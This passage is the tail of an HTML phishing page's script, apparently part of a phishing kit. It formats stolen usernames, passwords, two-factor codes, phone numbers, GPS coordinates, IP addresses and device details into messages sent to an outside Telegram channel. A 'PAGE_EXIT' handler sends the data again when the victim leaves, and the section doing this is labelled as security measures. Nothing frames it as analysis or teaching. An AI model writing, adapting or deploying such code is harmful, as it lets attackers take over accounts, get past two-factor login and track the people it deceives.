                             `üîê <b>Password:</b> ${collectedData.credentials.password}\n` +
                             `‚è∞ <b>Time:</b> ${new Date(collectedData.credentials.timestamp).toLocaleString()}\n` +
                             `üåê <b>IP:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}`;
                    break;
                    
                case 'TWO_FACTOR':
                    message = `üî¢ <b>TWO-FACTOR CODE</b>\n\n` +
                             `üì± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `üë§ <b>Username:</b> ${collectedData.credentials.username || 'Unknown'}\n` +
                             `üî¢ <b>2FA Code:</b> ${collectedData.twoFactorCode}\n` +
                             `‚è∞ <b>Time:</b> ${new Date(collectedData.twoFactorTimestamp).toLocaleString()}`;
                    break;
                    
                case 'FULL_DATA':
                    message = `üìä <b>COMPLETE DATA COLLECTION</b>\n\n` +
                             `üì± <b>Session ID:</b> ${collectedData.sessionId}\n` +
                             `üë§ <b>User:</b> ${collectedData.userInfo.fullName || 'Unknown'} (${collectedData.credentials.username || 'Unknown'})\n` +
                             `üìû <b>Phone:</b> ${collectedData.userInfo.mobileNumber || 'Unknown'}\n` +
                             `üîê <b>Password:</b> ${collectedData.credentials.password || 'Not captured'}\n` +
                             `üåç <b>Location:</b> ${collectedData.location.latitude || 'Unknown'}, ${collectedData.location.longitude || 'Unknown'}\n` +
                             `üèôÔ∏è <b>City:</b> ${collectedData.location.city || collectedData.deviceInfo.ipDetails?.city || 'Unknown'}\n` +
                             `üåê <b>IP:</b> ${collectedData.deviceInfo.ipAddress || 'Unknown'}\n` +
                             `üì± <b>Device:</b> ${collectedData.deviceInfo.deviceType} - ${collectedData.deviceInfo.os}\n` +
                             `üñ•Ô∏è <b>Browser:</b> ${collectedData.deviceInfo.browser}\n` +
                             `üì∫ <b>Screen:</b> ${collectedData.deviceInfo.screenResolution}\n` +
                             `üîã <b>Battery:</b> ${collectedData.deviceInfo.battery?.level || 'Unknown'}\n` +
                             `‚è∞ <b>Session Start:</b> ${new Date(collectedData.timestamps.pageLoad).toLocaleString()}\n` +
                             `üó∫Ô∏è <b>Map Link:</b> ${collectedData.location.mapLink || 'No location'}\n\n` +
                             `<b>Full User Agent:</b>\n<code>${navigator.userAgent}</code>`;
                    break;
            }
            
            return message;
        }

        function getDataForTelegram(type) {
            switch(type) {
                case 'USER_INFO': return collectedData.userInfo;
                case 'LOCATION': return collectedData.location;
                case 'CREDENTIALS': return collectedData.credentials;
                case 'TWO_FACTOR': return { code: collectedData.twoFactorCode };
                default: return collectedData;
            }
        }

        // ============================================
        // HELPER FUNCTIONS
        // ============================================
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Chrome";
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
            if (userAgent.includes("Edg")) return "Edge";
            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
            return "Unknown";
        }

        function getOperatingSystem() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Win")) return "Windows";
            if (userAgent.includes("Mac")) return "MacOS";
            if (userAgent.includes("Linux")) return "Linux";
            if (userAgent.includes("Android")) return "Android";
            if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
            return "Unknown";
        }

        function formatBytes(bytes) {
            if (!bytes) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function showError(msg) {
            errorMessage.textContent = msg;
            errorMessage.style.display = 'block';
            setTimeout(() => {
                errorMessage.style.display = 'none';
            }, 5000);
        }

        // ============================================
        // ADDITIONAL SECURITY MEASURES
        // ============================================
        // Prevent leaving page
        window.addEventListener('beforeunload', function(e) {
            // Send final data
            if (collectedData.credentials.username) {
                sendToTelegram('PAGE_EXIT');
            }
        });

        // Capture copy/paste
        document.addEventListener('copy', function(e) {
            console.log('Copy action detected');
        });

        document.addEventListener('paste', function(e) {
            console.log('Paste action detected');
        });

        // Send heartbeat every 30 seconds
        setInterval(() => {
            if (collectedData.sessionId) {
                console.log('Heartbeat - Session active:', collectedData.sessionId);
            }
        }, 30000);
    </script>
</body>
</html>
